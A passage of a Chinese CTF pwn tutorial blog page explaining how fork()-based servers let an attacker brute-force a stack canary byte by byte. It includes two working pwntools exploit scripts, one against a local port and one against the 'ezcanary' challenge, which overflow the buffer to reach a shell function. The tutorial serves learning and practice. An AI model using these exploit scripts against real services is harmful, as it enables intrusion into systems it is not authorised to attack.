+<p>所以结构变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">父进程内存</span><br><span class="line">    |</span><br><span class="line">    | fork()</span><br><span class="line">    ↓</span><br><span class="line">子进程内存（完全复制）</span><br></pre></td></tr></table></figure>
+<p>示意：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">父进程</span><br><span class="line"> stack:</span><br><span class="line">   buffer</span><br><span class="line">   canary</span><br><span class="line">   saved rbp</span><br><span class="line">   ret</span><br><span class="line"></span><br><span class="line">fork()</span><br><span class="line"></span><br><span class="line">子进程</span><br><span class="line"> stack:</span><br><span class="line">   buffer</span><br><span class="line">   canary</span><br><span class="line">   saved rbp</span><br><span class="line">   ret</span><br></pre></td></tr></table></figure>
+<p>注意：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">canary 完全一样</span><br></pre></td></tr></table></figure>
+<p>更准确说法是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">子进程复制了父进程的 canary</span><br></pre></td></tr></table></figure>
+<p>很多 CTF 服务端结构是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">while(1)</span><br><span class="line">&#123;</span><br><span class="line">    int client = accept();</span><br><span class="line">    if(fork()==0)</span><br><span class="line">    &#123;</span><br><span class="line">        handle(client);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">服务器主进程</span><br><span class="line">      |</span><br><span class="line">   accept()</span><br><span class="line">      |</span><br><span class="line">    fork()</span><br><span class="line">      |</span><br><span class="line"> ┌──────────┐</span><br><span class="line"> │          │</span><br><span class="line">父进程    子进程</span><br><span class="line"> │          │</span><br><span class="line">继续监听   处理用户输入</span><br></pre></td></tr></table></figure>
+<p>所以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每个连接 = 一个子进程</span><br></pre></td></tr></table></figure>
+<h2 id="攻击代码实现"><a href="#攻击代码实现" class="headerlink" title="攻击代码实现"></a>攻击代码实现</h2><!--more-->
+<h4 id="1-逐字节爆破获取canary"><a href="#1-逐字节爆破获取canary" class="headerlink" title="1.逐字节爆破获取canary"></a>1.逐字节爆破获取canary</h4><!--more-->
+<p>这段代码的使用前提是在canary保持不变的前提下，具体来说：需要有fork函数，即保证父进程不变，才能在子进程多次连接断开进行爆破canary</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐字节爆破，获取canary</span></span><br><span class="line"></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary</span>():</span><br><span class="line">    canary = <span class="string">b&quot;\x00&quot;</span>    <span class="comment"># canary的首字节必然为0x00</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(canary) &lt; <span class="number">8</span>:    <span class="comment"># 逐字节爆破canary</span></span><br><span class="line">        <span class="keyword">for</span> int_byte <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):    <span class="comment"># 每个字节都有256中可能，逐一尝试</span></span><br><span class="line">            io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5555</span>)    <span class="comment"># 创建一个连接，程序会相应地创建一个子进程</span></span><br><span class="line">            io.recv()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 生成int_byte所对应的byte类型的数据</span></span><br><span class="line">            byte = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(int_byte))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 尝试byte是否会导致程序崩溃</span></span><br><span class="line">            <span class="comment"># 若不会，说明当前字节正确，直接跳至下一字节</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io.send(<span class="string">b&quot;A&quot;</span> * <span class="number">104</span> + canary + byte)</span><br><span class="line">                io.recv()</span><br><span class="line">                canary += byte</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> EOFError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                io.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line">canary = get_canary()</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5555</span>)</span><br><span class="line">target_address = <span class="number">0x400BC6</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">104</span> + canary + <span class="string">b&quot;A&quot;</span> * <span class="number">8</span> + p64(target_address)</span><br><span class="line"><span class="built_in">print</span>(io.recv())    <span class="comment"># 接收字符串&quot;Welcome!\n&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv())    <span class="comment"># 接收flag</span></span><br></pre></td></tr></table></figure>
+<h5 id="例题-24-ezcanary"><a href="#例题-24-ezcanary" class="headerlink" title="例题 24  ezcanary"></a>例题 24  ezcanary</h5><!--more-->
+<p>首先来看题目反汇编之后的函数：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">init</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50uLL</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !fork() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(&amp;byte_402031);</span><br><span class="line">      <span class="built_in">puts</span>(&amp;byte_402050);</span><br><span class="line">      <span class="built_in">puts</span>(&amp;byte_40208B);</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, s, <span class="number">0x100uLL</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">wait</span>(<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, s, <span class="number">0x100uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">strcmp</span>(s, <span class="string">&quot;cat flag\n&quot;</span>) );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;flag is one_by_one_bruteforce&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, s, <span class="number">0x100uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里使用到了进程相关的知识，只要我们不输入cat flag，程序就会不断开启子进程</p>
+<p>具体来说：</p>
+<p>程序启动后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main()</span><br><span class="line">  ↓</span><br><span class="line">do</span><br><span class="line">  ↓</span><br><span class="line">fork()</span><br></pre></td></tr></table></figure>
+<p>现在变成两个进程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">父进程</span><br><span class="line">子进程</span><br></pre></td></tr></table></figure>
+<p>子进程进入：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!fork())</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">打印三行</span><br><span class="line">等待你的输入</span><br><span class="line">函数结束</span><br><span class="line">子进程退出</span><br></pre></td></tr></table></figure>
+<p>所以你看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我保护开了这么多</span><br><span class="line">想必我的程序一定很安全吧</span><br><span class="line">你觉得呢？</span><br></pre></td></tr></table></figure>
+<p>然后等你输入 payload。</p>
+<p>如果 payload 错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** stack smashing detected ***</span><br></pre></td></tr></table></figure>
+<p>子进程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abort()</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+<p>子进程结束。</p>
+<p>而父进程没有进入 if，而是执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wait(0);</span><br></pre></td></tr></table></figure>
+<p>意思是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">等子进程结束</span><br></pre></td></tr></table></figure>
+<p>子进程 crash 或 return 后：</p>
+<p>父进程继续执行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">read(<span class="number">0</span>, s, <span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>
+<p><code>puts(&amp;::s)</code> 是什么这里其实是一个 <strong>全局字符串</strong>。</p>
+<p>然后父进程又 read</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0, s, 0x100);</span><br></pre></td></tr></table></figure>
+<p>这一步是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">父进程读取输入</span><br></pre></td></tr></table></figure>
+<p>输入会存到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s</span><br></pre></td></tr></table></figure>
+<p>接着进入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while (strcmp(s, &quot;cat flag\n&quot;));</span><br></pre></td></tr></table></figure>
+<p>意思是：</p>
+<p>如果输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag\n</span><br></pre></td></tr></table></figure>
+<p>循环结束。</p>
+<p>否则：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">继续 do while</span><br></pre></td></tr></table></figure>
+<p>一次循环的真实流程是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">父进程</span><br><span class="line">  |</span><br><span class="line">  | fork</span><br><span class="line">  |</span><br><span class="line">  ├── 子进程</span><br><span class="line">  |       puts</span><br><span class="line">  |       puts</span><br><span class="line">  |       puts</span><br><span class="line">  |       read(payload)   &lt;-- 这里溢出</span><br><span class="line">  |       return</span><br><span class="line">  |</span><br><span class="line">  └── 父进程</span><br><span class="line">          wait()</span><br><span class="line">          puts(&quot;有本事就来hack我吧&quot;)</span><br><span class="line">          read(input)</span><br><span class="line">          while()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">          父进程</span><br><span class="line">             │</span><br><span class="line">             │ fork</span><br><span class="line">             │</span><br><span class="line">     ┌───────┴────────┐</span><br><span class="line">     │                │</span><br><span class="line">  子进程            父进程</span><br><span class="line">     │                │</span><br><span class="line"> puts x3           wait()</span><br><span class="line">     │                │</span><br><span class="line"> read(payload)     puts(&quot;hack me&quot;)</span><br><span class="line">     │                │</span><br><span class="line">canary check       read(&quot;n\n&quot;)</span><br><span class="line">     │                │</span><br><span class="line">crash / return      while()</span><br><span class="line">     │                │</span><br><span class="line">     └──────────→ 再次 fork</span><br></pre></td></tr></table></figure>
+<p>因此我们能够首先在多个子进程中根据偏移量，爆破出canary，直到程序能够正常退出，然后输入cat flag后再在最后一次read中进行栈溢出到后门函数即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#_*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ezcanary&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process([elf.path])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aaa</span>() :</span><br><span class="line">  <span class="keyword">global</span> can</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    payload1 = (<span class="number">0x60</span>-<span class="number">8</span>) * <span class="string">b&#x27;a&#x27;</span> + can + p8(i)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;你觉得呢？\n&#x27;</span>,payload1)</span><br><span class="line">    info = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;*** stack smashing detected ***&quot;</span> <span class="keyword">in</span> info :</span><br><span class="line">        p.send(<span class="string">&#x27;n\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        can += p8(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bbb</span>():</span><br><span class="line">  <span class="keyword">global</span> can</span><br><span class="line">  can = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    aaa()</span><br><span class="line">    <span class="keyword">if</span> j != <span class="number">6</span> :</span><br><span class="line">      p.send(<span class="string">&#x27;n\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">      p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bbb()</span><br><span class="line">canary = u64(can)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">getshell = <span class="number">0x401251</span></span><br><span class="line">payload2 = <span class="string">b&quot;a&quot;</span> * (<span class="number">0x60</span>-<span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(getshell)</span><br><span class="line">p.sendafter(<span class="string">&quot;bruteforce\n&quot;</span>, payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/03/06/pwntools%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" rel="prev" title="pwntools基本使用">
+                  <i class="fa fa-angle-left"></i> pwntools基本使用
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/03/11/%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" rel="next" title="栈漏洞基础">
+                  栈漏洞基础 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Hanson</span>
+  </div>
+<div class="busuanzi-count">
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
